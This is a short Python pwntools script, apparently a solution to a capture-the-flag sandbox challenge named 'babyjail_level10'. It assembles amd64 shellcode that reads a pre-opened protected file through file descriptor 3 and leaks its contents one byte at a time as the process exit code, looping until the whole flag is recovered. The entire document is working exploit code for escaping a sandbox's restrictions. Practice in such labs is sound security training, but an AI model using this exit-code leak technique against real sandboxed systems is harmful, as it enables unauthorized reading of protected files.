#!/usr/bin/env python3

from pwn import *

def payload_gen(offset):
    read_addr = 0x01337200
    exit_val_addr = read_addr + offset
    assembly_code = f'''
    mov rdi, 3
    mov rsi, {read_addr}
    mov rdx, 0x50
    mov rax, 0
    syscall
    mov dil, BYTE PTR [{exit_val_addr}]
    mov rax, 60
    syscall
    '''
    print(assembly_code)
    shellcode = asm(assembly_code, arch='amd64')
    formatted_shellcode = ''.join('\\x{:02x}'.format(byte) for byte in shellcode)
    print('Formatted Shellcode:')
    print(formatted_shellcode)
    return shellcode

def leak(bin_argv):
    flag = ''
    offset = 0
    while True:
        p = process(bin_argv)
        p.readuntil('Reading 0x1000 bytes of shellcode from stdin.\n\n')

        payload = payload_gen(offset)
        offset = offset + 1
        p.sendline(payload)

        p.wait()
        cur_byte = chr(p.poll())
        flag = flag + cur_byte
        print(flag)
        if(cur_byte == '}'):
            break

leak(['/challenge/babyjail_level10', '/flag'])
